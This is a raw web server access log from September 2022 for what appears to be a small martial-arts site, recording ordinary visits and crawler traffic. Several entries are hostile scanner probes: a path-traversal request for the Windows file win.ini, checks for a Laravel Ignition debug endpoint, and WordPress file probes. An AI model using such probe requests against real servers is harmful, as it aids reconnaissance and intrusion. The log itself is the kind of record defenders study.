::ffff:167.71.130.9 - - [22/Sep/2022:10:35:03 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
::ffff:207.46.13.215 - - [22/Sep/2022:10:36:33 +0000] "GET /images/instructors/justin.jpg HTTP/1.1" 200 14091 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:94.102.61.10 - - [22/Sep/2022:10:38:11 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "python-requests/2.26.0"
::ffff:94.102.61.10 - - [22/Sep/2022:10:38:13 +0000] "GET / HTTP/1.1" 200 58140 "-" "python-requests/2.26.0"
::ffff:216.244.66.196 - - [22/Sep/2022:10:44:20 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:216.244.66.196 - - [22/Sep/2022:10:46:10 +0000] "GET /locations.php HTTP/1.1" 404 152 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:46.42.16.147 - - [22/Sep/2022:10:51:16 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::ffff:73.93.253.46 - - [22/Sep/2022:11:15:40 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:40.77.167.46 - - [22/Sep/2022:11:22:11 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:193.46.255.199 - - [22/Sep/2022:11:28:01 +0000] "GET /Electron/download/windows/\Windows\win.ini HTTP/1.0" 404 185 "-" "xfa1,nvdorz"
::ffff:147.78.47.249 - - [22/Sep/2022:11:28:58 +0000] "GET /_ignition/health-check/ HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:147.78.47.249 - - [22/Sep/2022:11:29:00 +0000] "GET /public/_ignition/health-check/ HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:147.78.47.249 - - [22/Sep/2022:11:29:02 +0000] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:73.93.253.46 - - [22/Sep/2022:11:39:00 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:194.38.20.161 - - [22/Sep/2022:11:41:14 +0000] "GET /wp-content/themes/konzept/style.css HTTP/1.1" 404 174 "-" "ALittle Client"
::ffff:157.55.39.132 - - [22/Sep/2022:11:44:25 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
